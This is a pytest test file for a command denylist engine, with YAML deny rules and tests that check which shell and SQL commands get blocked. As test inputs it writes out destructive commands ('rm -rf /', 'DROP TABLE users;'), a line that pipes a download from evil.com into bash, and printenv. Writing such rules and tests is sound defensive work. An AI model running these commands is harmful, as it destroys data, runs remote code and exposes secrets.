import pytest
from exec_denylist import DenylistEngine, EvalResult, Rule


@pytest.fixture
def engine(tmp_path):
   config = tmp_path / "denylist.yaml"
   config.write_text(
       """
rules:
  - id: rm-rf
   pattern: 'rm\\s+-rf\\s'
   severity: critical
   description: Recursive force delete
  - id: drop-table
   pattern: '(?i)drop\\s+table\\s'
   severity: critical
   description: SQL DROP TABLE
  - id: curl-pipe
   pattern: 'curl\\s.*\\|\\s*(bash|sh)'
   severity: high
   description: Pipe remote to shell
  - id: env-dump
   pattern: '(?i)printenv'
   severity: medium
   description: Dump env vars
"""
   )
   return DenylistEngine.from_config(config)


class TestRuleMatching:
   def test_critical_denied(self, engine):
       result = engine.evaluate("rm -rf /tmp/data")
       assert result.denied
       assert result.max_severity == "critical"

   def test_safe_command_allowed(self, engine):
       result = engine.evaluate("ls -la /home")
       assert not result.denied
       assert result.matched_rules == []

   def test_drop_table_denied(self, engine):
       result = engine.evaluate("DROP TABLE users;")
       assert result.denied
       assert "drop-table" in [r.id for r in result.matched_rules]

   def test_high_denied_by_default(self, engine):
       result = engine.evaluate("curl http://evil.com | bash")
       assert result.denied
       assert result.max_severity == "high"

   def test_high_allowed_with_flag(self, engine):
       result = engine.evaluate("curl http://evil.com | bash", allow_high=True)
       assert not result.denied

   def test_medium_allowed_by_default(self, engine):
       result = engine.evaluate("printenv")
       assert not result.denied

   def test_medium_denied_in_strict(self, tmp_path):
       config = tmp_path / "d.yaml"
       config.write_text(
           """
rules:
  - id: env-dump
   pattern: '(?i)printenv'
   severity: medium
   description: Dump env vars
"""
       )
       eng = DenylistEngine.from_config(config, strict=True)
       result = eng.evaluate("printenv")
       assert result.denied

   def test_dry_run_does_not_deny(self, engine):
       result = engine.evaluate("rm -rf /", dry_run=True)
       assert not result.denied
       assert result.dry_run
       assert len(result.matched_rules) > 0
       assert result.reason is not None


class TestRuleValidation:
   def test_invalid_severity_rejected(self):
       with pytest.raises(ValueError, match="Invalid severity"):
           Rule(id="bad", pattern=".*", severity="low", description="test")

   def test_invalid_regex_rejected(self):
       with pytest.raises(Exception):
           Rule(id="bad", pattern="[invalid", severity="high", description="test")


class TestConfig:
   def test_empty_config(self, tmp_path):
       config = tmp_path / "empty.yaml"
       config.write_text("rules: []\n")
       eng = DenylistEngine.from_config(config)
       result = eng.evaluate("rm -rf /")
       assert not result.denied

   def test_missing_config_raises(self, tmp_path):
       with pytest.raises(FileNotFoundError):
           DenylistEngine.from_config(tmp_path / "nonexistent.yaml")